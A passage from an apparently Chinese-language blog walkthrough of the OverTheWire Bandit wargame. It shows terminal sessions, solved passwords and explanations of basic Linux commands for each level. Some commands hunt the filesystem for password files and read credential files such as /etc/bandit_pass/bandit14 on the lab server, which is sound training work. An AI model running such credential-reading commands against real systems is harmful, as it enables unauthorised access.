../</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere00/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere01/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere02/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere03/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere04/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere05/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere06/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere07/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere08/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere09/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere10/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere11/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere12/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere13/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere14/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere15/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere16/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere17/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere18/</div><div class=\"line\">drwxr-x---  2 root    bandit5 4096 Sep 28 14:04 maybehere19/</div><div class=\"line\">bandit5@bandit:~/inhere$ find . -type f -size 1033c</div><div class=\"line\">./maybehere07/.file2</div><div class=\"line\">bandit5@bandit:~/inhere$ cat ./maybehere07/.file2</div><div class=\"line\">DXjZPULLxYr17uwoI01bNLQbtFemEgo7</div></pre></td></tr></table></figure>\n<p>心路历程：第二个命令 <code>cd inhere; ll</code> 两个命令通过分号间隔，会分别执行。我们发现 inhere 目录下还有好多目录（文件夹）。这如果一个一个找就累死了。我们使用 <code>find</code> 命令查找一下。<code>-type f</code>指定文件类型为普通文件，<code>-size 1033c</code> 指定文件大小为 1033 bytes。具体可参考我上面给出的 <a href=\"http://man.linuxde.net/\" target=\"_blank\" rel=\"external\">Linux 命令大全</a><br>提示：<code>ls -l</code> 后每行开头的字符串中第一个字母是「d」表示为「directory」- 目录。我们使用的 <code>ll</code> 在 .bashrc 文件中被定义为 <code>ls -alF</code> 其中 <code>a</code> 是显示隐藏文件， <code>l</code> 是详细信息， <code>F</code> 是每条后面追加文件类型标识符，我们输出的每行内容尾部都有的「／」就表示这些都是目录。</p>\n<hr>\n<p>Level 6 - 7</p>\n<p>描述：下一级别的密码存储在服务器的某个位置，具有以下所有属性： 所属用户bandit7，所属用户组bandit6，拥有 33个字节的大小</p>\n<p>密码：HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit6@bandit:~$ find / -group bandit6 -user bandit7 -size 33c 2&gt;/dev/null</div><div class=\"line\">/var/lib/dpkg/info/bandit7.password</div><div class=\"line\">bandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.password</div><div class=\"line\">HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs</div></pre></td></tr></table></figure>\n<p>心路历程：描述中说「存储在服务器的某个位置」，我们使用「／」这个 linux 根目录作为我们搜索的最顶层。其中我们还用到了 Linux 下的「黑洞」，把错误输入全扔了进去。这样就只返回了正确结果。<br>如果把错误输出重定向到「黑洞」中，就是酱紫滴：<br><img src=\"/Image/bandit_resources/6672B54C1537E1423C2D857DA346FF5B.jpg\" alt=\"IMAGE\"><br>太多干扰信息不好观察。<br>提示：「2&gt;/dev/null」中「2」表示错误输出，「&gt;」是重定向符号表示把信息送到哪里，「/dev/null」是「Linux黑洞」。这里有篇文章供参考👉<a href=\"http://www.kissyu.org/2016/12/25/shell%E4%B8%AD%3E%20:dev:null%202%20%3E%20&amp;1%E6%98%AF%E4%BB%80%E4%B9%88%E9%AC%BC%EF%BC%9F/\" target=\"_blank\" rel=\"external\">shell中&gt;/dev/null 2&gt;&amp;1是什么鬼？</a></p>\n<hr>\n<p>Level 7 - 8</p>\n<p>描述：下一级的密码存储文件data.txt中 “millionth” 的下一个单词。</p>\n<p>密码： cvX2JJa4CFALtqS87jk27qwqGhBM9plV</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit7@bandit:~$ ll</div><div class=\"line\">total 4112</div><div class=\"line\">drwxr-xr-x  3 bandit7 bandit7    4096 Nov 11 07:48 ./</div><div class=\"line\">drwxr-xr-x 30 root    root       4096 Nov 11 07:48 ../</div><div class=\"line\">-rw-r--r--  1 bandit7 bandit7     220 Apr  9  2014 .bash_logout</div><div class=\"line\">-rw-r--r--  1 bandit7 bandit7    3637 Apr  9  2014 .bashrc</div><div class=\"line\">drwx------  2 bandit7 bandit7    4096 Nov 11 07:48 .cache/</div><div class=\"line\">-rw-r--r--  1 bandit7 bandit7     675 Apr  9  2014 .profile</div><div class=\"line\">-rw-r-----  1 bandit8 bandit7 4184396 Sep 28 14:04 data.txt</div><div class=\"line\">bandit7@bandit:~$ grep millionth data.txt</div><div class=\"line\">millionth       cvX2JJa4CFALtqS87jk27qwqGhBM9plV</div></pre></td></tr></table></figure>\n<p>心路历程：我们查看文件详细内容时发现这个文件比较大，光靠肉眼找是没戏了。所以我们借助命令 <code>grep</code> 找到 「milionth」这个单词所在行的内容，后面跟着下一关的密码。（其实最开始我惯性的<code>ls</code> 然后 <code>cat</code> 了一下……发觉不太对赶紧 <code>ctrl+c</code> 终止， <code>ll</code> 看了眼大小……）</p>\n<hr>\n<p>Level 8 - 9</p>\n<p>描述：下一个级别的密码存储在文件data.txt中，并且是仅出现一次的文本行。</p>\n<p>密码：UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit8@bandit:~$ ls</div><div class=\"line\">data.txt</div><div class=\"line\">bandit8@bandit:~$ sort data.txt | uniq -u</div><div class=\"line\">UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR</div></pre></td></tr></table></figure>\n<p>心路历程：又描述得知这是一个文本文件，里面有很多行字符串，我们需要找到其中仅出现一次的行。使用 <code>sort</code> 命令对文件排序后再对其结果进行 <code>uniq -u</code> 只显示其中的单一行。<br>提示：uniq -u 是上下相邻两行对比得到是否为单一行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit8@bandit:~$ <span class=\"built_in\">echo</span> -en <span class=\"string\">\"1\\n1\\n2\\n1\\n\"</span> &gt;test.txt</div><div class=\"line\">bandit8@bandit:~$ cat test.txt </div><div class=\"line\">1</div><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">1</div><div class=\"line\">bandit8@bandit:~$ uniq -u test.txt </div><div class=\"line\">2</div><div class=\"line\">1</div></pre></td></tr></table></figure></p>\n<p>如例子中的前两行被认定为重复行，第二行与第三行不同，第三行与第四行不同，所以「2」被当作了唯一行。第四行中的「1」同理。<br>所以我们这里要先对文件排序：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit8@bandit:~$ sort test.txt &gt; sorted.txt; cat sorted.txt</div><div class=\"line\">1</div><div class=\"line\">1</div><div class=\"line\">1</div><div class=\"line\">2</div></pre></td></tr></table></figure></p>\n<p>然后再筛选唯一行：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit8@bandit:~$ uniq -u sorted.txt</div><div class=\"line\">2</div></pre></td></tr></table></figure></p>\n<hr>\n<p>Level 9 - 10</p>\n<p>描述：下一个级别的密码存储在文件data.txt中的几个人类可读字符串之一，从几个“=”字符开始。</p>\n<p>密码：truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit9@bandit:~$ ls</div><div class=\"line\">data.txt</div><div class=\"line\">bandit9@bandit:~$ strings data.txt | grep ==</div><div class=\"line\">|========== the</div><div class=\"line\">========== password</div><div class=\"line\">========== is</div><div class=\"line\">========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk</div></pre></td></tr></table></figure>\n<p>心路历程：描述中提到了几个人类可读字符，那我们用 strings 筛选一下（strings是在文件中查找可打印字符串并输出长度为4个或更多的字符串，遇到换行或空字符结束）。其中也提到从几个「=」符号开始，那我们用 grep 命令筛选 含有「==」的字符串看看。</p>\n<hr>\n<p>Level 10 - 11</p>\n<p>描述：下一级别的密码存储在data.txt文件中，该文件包含base64编码数据</p>\n<p>密码：IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit10@bandit:~$ ls</div><div class=\"line\">data.txt</div><div class=\"line\">bandit10@bandit:~$ cat data.txt</div><div class=\"line\">VGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==</div><div class=\"line\">bandit10@bandit:~$ base64 <span class=\"_\">-d</span> data.txt </div><div class=\"line\">The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR</div></pre></td></tr></table></figure>\n<p>心路历程：题目告诉我们使用 base64 编码了数据，那我们解码就好了。</p>\n<hr>\n<p>Level 11 - 12</p>\n<p>描述：下一级的密码存储在文件data.txt中，其中所有小写（a-z）和大写（A-Z）字母已经被旋转了13个位置</p>\n<p>密码：5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit11@bandit:~$ ls</div><div class=\"line\">data.txt</div><div class=\"line\">bandit11@bandit:~$ cat data.txt</div><div class=\"line\">Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh</div><div class=\"line\">bandit11@bandit:~$ cat data.txt | tr <span class=\"string\">'a-zA-Z'</span> <span class=\"string\">'n-za-mN-ZA-M'</span></div><div class=\"line\">The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu</div></pre></td></tr></table></figure>\n<p>心路历程：这里我们用到了 <code>tr</code> 命令，参数为两个字符集，把第一个字符集中的字符替换为第二个字符集中的对应字符。题目中说旋转了13个位置，相当于26个字母前十三个和后十三个换了个位置。按照这样的对应关系，调整给出的字符集。<br>提示：有人会写程序来做替换，但是对于这道题来讲 tr 会方便很多。虽然这个命令不常用，用起来还是很爽的。</p>\n<hr>\n<p>Level 12 - 13</p>\n<p>描述：下一级的密码存储在data.txt文件中，该文件是一个已被重复压缩的文件的十六进制转储文件。对于这个级别，可以在 <code>/tmp</code> 下使用 <code>mkdir</code> 创建一个工作的目录。例如：<code>mkdir /tmp/myname123</code> 。然后使用 <code>cp</code> 复制数据文件，并使用 <code>mv</code> 重命名（阅读manpages！）<br>密码：8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit12@bandit:~$ ls</div><div class=\"line\">data.txt</div><div class=\"line\">bandit12@bandit:~$ mkdir /tmp/GeekaLeo123 ; cp data.txt /tmp/GeekaLeo123/data_1 ; <span class=\"built_in\">cd</span> /tmp/GeekaLeo123</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ cat data_1 ; file data_1</div><div class=\"line\">0000000: 1f8b 0808 5601 <span class=\"built_in\">cd</span>59 0203 6461 7461 322e  ....V..Y..data2.</div><div class=\"line\">0000010: 6269 6e00 013f 02c0 fd42 5a68 3931 4159  bin..?...BZh91AY</div><div class=\"line\">0000020: 2653 5914 13ca ff00 001b ffff faef 7fff  &amp;SY.............</div><div class=\"line\">0000030: f9fb a79e de5b efbb ffff fd7f cf7b fbff  .....[.......&#123;..</div><div class=\"line\">0000040: ff7f afbd 8ddb ff77 f752 ffff b001 3b56  .......w.R....;V</div><div class=\"line\">0000050: 6100 01a3 d400 0000 0068 d0d0 69a0 0000  a........h..i...</div><div class=\"line\">0000060: 007a 867a 9034 0340 6401 a340 0000 f280  .z.z.4.@d..@....</div><div class=\"line\">0000070: 01ea 0d1a 1a1a 0d01 9034 0e40 0000 0686  .........4.@....</div><div class=\"line\">0000080: 8d00 00c8 6819 3406 8d1e a003 d400 0c80  ....h.4.........</div><div class=\"line\">0000090: f534 0034 309a 0006 83d4 0000 01a6 80c8  .4.40...........</div><div class=\"line\">00000a0: 1900 6103 a01b 5034 69a1 a1a0 6868 3403  ..a...P4i...hh4.</div><div class=\"line\">00000b0: 4341 a340 64f5 3400 0680 6801 a340 6800  CA.@d.4...h..@h.</div><div class=\"line\">00000c0: 000d 0068 0340 00d0 01a1 a068 3430 3516  ...h.@.....h405.</div><div class=\"line\">00000d0: 1543 1355 0d26 5d39 505d 970e fcac 9c37  .C.U.&amp;]9P].....7</div><div class=\"line\">00000e0: 0ec4 62b1 05bc 607b 68e4 c4f4 efa3 32f8  ..b...`&#123;h.....2.</div><div class=\"line\">00000f0: 6d9e 9c52 9d50 36a0 5598 b734 a0c4 7683  m..R.P6.U..4..v.</div><div class=\"line\">0000100: 04e3 7cbd ec15 ea5d 1db8 1283 ea8b 4318  ..|....]......C.</div><div class=\"line\">0000110: 0358 207a a12c 554f 4a2d 5428 eb47 6e7c  .X z.,UOJ-T(.Gn|</div><div class=\"line\">0000120: ffdc 4018 60<span class=\"built_in\">fc</span> 0690 28ec 12b9 5d02 eecb  ..@.`...(...]...</div><div class=\"line\">0000130: 11d4 e987 eb36 d574 e87c 2e67 f803 2cdf  .....6.t.|.g..,.</div><div class=\"line\">0000140: b465 9110 302d a9c0 0c33 3e55 573c 8818  .e..0-...3&gt;UW&lt;..</div><div class=\"line\">0000150: 76cf 6c6a 5efd c51e 20ec 2358 f5a8 694e  v.lj^... .<span class=\"comment\">#X..iN</span></div><div class=\"line\">0000160: bc7a bc91 0376 ebc8 61a2 33c1 97e9 936d  .z...v..a.3....m</div><div class=\"line\">0000170: df2b ceef 0a4f 6039 8cb5 b9cc d490 607b  .+...O`9......`&#123;</div><div class=\"line\">0000180: ff20 e253 1875 489a 0465 3643 497e 8348  . .S.uH..e6CI~.H</div><div class=\"line\">0000190: 51dd d85e 5038 9c31 fcc3 bb2b 6157 0413  Q..^P8.1...+aW..</div><div class=\"line\">00001a0: 7b90 6633 f706 0005 3dc0 7d9b f4ba b026  &#123;.f3....=.&#125;....&amp;</div><div class=\"line\">00001b0: 1a91 eca8 8423 7d1b 0401 d150 0c14 1<span class=\"built_in\">fc</span>5  .....<span class=\"comment\">#&#125;....P....</span></div><div class=\"line\">00001c0: ef57 ef39 3e53 dfc5 c2ce 29de 871f dce8  .W.9&gt;S....).....</div><div class=\"line\">00001d0: 2f85 3ff8 1f16 a894 6677 d26e a7b6 2550  /.?.....fw.n..%P</div><div class=\"line\">00001e0: bc05 d2e6 51f8 d799 52f1 2783 a642 db4e  ....Q...R.<span class=\"string\">'..B.N</span></div><div class=\"line\">00001f0: 344f b1a4 608c 4249 20f6 549e 64db e2e8  4O..`.BI .T.d...</div><div class=\"line\">0000200: 55da 10b5 adfc 28fd 1a8c 7e81 4188 5028  U.....(...~.A.P(</div><div class=\"line\">0000210: 29ec ddf4 4bef 8de6 9a0b 0d49 14e7 d30e  )...K......I....</div><div class=\"line\">0000220: 48a4 55b8 5729 7484 2900 e001 e451 7290  H.U.W)t.)....Qr.</div><div class=\"line\">0000230: 057c f004 bb85 0788 0139 d730 8a08 0448  .|.......9.0...H</div><div class=\"line\">0000240: 4a45 0565 243c 7017 9906 e644 ff8b b922  JE.e$&lt;p....D...\"</div><div class=\"line\">0000250: 9c28 480a 09e5 7f80 c978 5ff9 3f02 0000  .(H......x_.?...</div><div class=\"line\">data_1: ASCII text</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ xxd -r data_1 &gt; data_2 ; file data_2</div><div class=\"line\">data_2: gzip compressed data, was \"data2.bin\", from Unix, last modified: Thu Sep 28 14:04:06 2017, max compression</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ mv data_2 data_3.gz ; gzip -d data_3.gz ; ls</div><div class=\"line\">data_1  data_3</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ file data_3</div><div class=\"line\">data_3: bzip2 compressed data, block size = 900k</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ mv data_3 data_4.bz2 ; bzip2 -d data_4.bz2 ; ls</div><div class=\"line\">data_1  data_4</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ file data_4</div><div class=\"line\">data_4: gzip compressed data, was \"data4.bin\", from Unix, last modified: Thu Sep 28 14:04:06 2017, max compression</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ mv data_4 data_5.gz ; gzip -d data_5.gz ; ls</div><div class=\"line\">data_1  data_5</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ file data_5</div><div class=\"line\">data_5: POSIX tar archive (GNU)</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ mv data_5 data_6.tar ; tar -xvf data_6.tar ; ls</div><div class=\"line\">data5.bin</div><div class=\"line\">data5.bin  data_1  data_6.tar</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ file data5.bin </div><div class=\"line\">data5.bin: POSIX tar archive (GNU)</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ mv data5.bin data_7.tar; tar -xvf data_7.tar ; ls </div><div class=\"line\">data6.bin</div><div class=\"line\">data6.bin  data_1  data_6.tar  data_7.tar</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ file data6.bin</div><div class=\"line\">data6.bin: bzip2 compressed data, block size = 900k</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ mv data6.bin data_8.bz2 ; bzip2 -d data_8.bz2 ; ls</div><div class=\"line\">data_1  data_6.tar  data_7.tar  data_8</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ file data_8</div><div class=\"line\">data_8: POSIX tar archive (GNU)</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ mv data_8 data_9.tar ; tar -xvf data_9.tar ; ls</div><div class=\"line\">data8.bin</div><div class=\"line\">data8.bin  data_1  data_6.tar  data_7.tar  data_9.tar</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ file data8.bin</div><div class=\"line\">data8.bin: gzip compressed data, was \"data9.bin\", from Unix, last modified: Thu Sep 28 14:04:06 2017, max compression</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ mv data8.bin data_10.gz ; gzip -d data_10.gz ; ls</div><div class=\"line\">data_1  data_10  data_6.tar  data_7.tar  data_9.tar</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ file data_10</div><div class=\"line\">data_10: ASCII text</div><div class=\"line\">bandit12@bandit:/tmp/GeekaLeo123$ cat data_10</div><div class=\"line\">The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL</div></pre></td></tr></table></figure>\n<p>心路历程：这关比较恶心了……按照对应的加密方式解密就好，用 <code>file</code> 查看文件类型，<code>mv</code> 命令修改名字，还有<code>bzip2 -d</code>、<code>gzip -d</code>、<code>tar -xvf</code>以及<code>xxd -r</code> 这些解密解压方法。</p>\n<hr>\n<p>Level 13 - 14</p>\n<p>描述：下一级的密码存储在<code>/etc/bandit\\_pass/bandit14</code> 中，只能由用户bandit14读取。对于这个级别，你不会得到下一个密码，但你会得到一个私人的SSH密钥，可以用来登录到下一个级别。注意：localhost是指您正在使用的机器的主机名<br>密码：4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit13@bandit:~$ ls</div><div class=\"line\">sshkey.private</div><div class=\"line\">bandit13@bandit:~$ ssh -i sshkey.private bandit14@bandit.labs.overthewire.org -p 2220</div><div class=\"line\">The authenticity of host <span class=\"string\">'[bandit.labs.overthewire.org]:2220 ([0.0.0.0]:2220)'</span> can<span class=\"string\">'t be established.</span></div><div class=\"line\">ECDSA key fingerprint is ee:4c:8c:e7:57:2c:bc:63:24:b8:e6:23:27:63:72:9f.</div><div class=\"line\">Are you sure you want to continue connecting (yes/no)? yes</div><div class=\"line\">Warning: Permanently added '[bandit.labs.overthewire.org]:2220,[0.0.0.0]:2220<span class=\"string\">' (ECDSA) to the list of known hosts.</span></div><div class=\"line\">...</div><div class=\"line\">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</div><div class=\"line\">applicable law.</div><div class=\"line\">bandit14@bandit:~$ cat /etc/bandit_pass/bandit14  </div><div class=\"line\">4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</div></pre></td></tr></table></figure>\n<p>心路历程：告诉我们需要 ssh 登陆进去，自己去找密码，我们就登录一下好了。</p>\n<hr>\n<p>Level 14 - 15<br>描述：通过将当前级别的密码提交到localhost上的端口30000，可以检索到下一级别的密码。<br>密码：BfMYroe26WYalil77FoDi9qh59eK5xNr</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit14@bandit:~$ nc localhost 30000 &lt; /etc/bandit_pass/bandit14</div><div class=\"line\">Correct!</div><div class=\"line\">BfMYroe26WYalil77FoDi9qh59eK5xNr</div></pre></td></tr></table></figure>\n<p>心路历程：我们使用 <code>nc</code> 命令来发送我们的密码，因为上一关我们已经知道密码在那放着了，刚好可以用到。<br>提示：什么？你想直接查看其他关的密码？不存在的……（权限啊老铁）</p>\n<hr>\n<p>Level 15 -16</p>\n<p>描述：可以通过使用SSL加密将当前级别的密码提交到本地主机上的端口30001来检索下一级别的密码。</p>\n<p>密码：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div></pre></td><td class=\"code\"><pre><div class=\"line\">bandit15@bandit:~$ openssl s_client -connect localhost:30001 -ign_eof                          </div><div class=\"line\">CONNECTED(00000003)</div><div class=\"line\">depth=0 CN = 8f75dc271013</div><div class=\"line\">verify error:num=18:self signed certificate</div><div class=\"line\">verify <span class=\"built_in\">return</span>:1</div><div class=\"line\">depth=0 CN = 8f75dc271013</div><div class=\"line\">verify <span class=\"built_in\">return</span>:1</div><div class=\"line\">---</div><div class=\"line\">Certificate chain</div><div class=\"line\"> 0 s:/CN=8f75dc271013</div><div class=\"line\">   i:/CN=8f75dc271013</div><div class=\"line\">---</div><div class=\"line\">Server certificate</div><div class=\"line\">-----BEGIN CERTIFICATE-----</div><div class=\"line\">MIICvjCCAaagAwIBAgIJALADbwWQ0u9aMA0GCSqGSIb3DQEBCwUAMBcxFTATBgNV</div><div class=\"line\">BAMTDDhmNzVkYzI3MTAxMzAeFw0xNzA5MTYwNzAyMjRaFw0yNzA5MTQwNzAyMjRa</div><div class=\"line\">MBcxFTATBgNVBAMTDDhmNzVkYzI3MTAxMzCCASIwDQYJKoZIhvcNAQEBBQADggEP</div><div class=\"line\">ADCCAQoCggEBALmjBUTlmjROJUssm+rAlFADFfzrz+xCH0qUXryou5/wW8pnQ6nG</div><div class=\"line\">HbdeRIBwTVGFiDIKRbFdWQU4BbrfjEhyGn9d7eh/3GV09ZdvLDYRoLmJ4tDF8CiC</div><div class=\"line\">wGl9GufcWr3zeaNYa8CwVdtWam8umhMICrsv7B5iV9RdSQfudUtVbr26SBVyuhBm</div><div class=\"line\">m0t7Su6rLCrrGtshdIihjk4k67bBMpSNAOduhpp79UgIPKcwJUhRJHTcji3m/IQ8</div><div class=\"line\">O9zNS25oL8KhMn7e/Xe70kztstq0ShMsx8feutONnGulUOlaEMMqW+HSWgnVeG/r</div><div 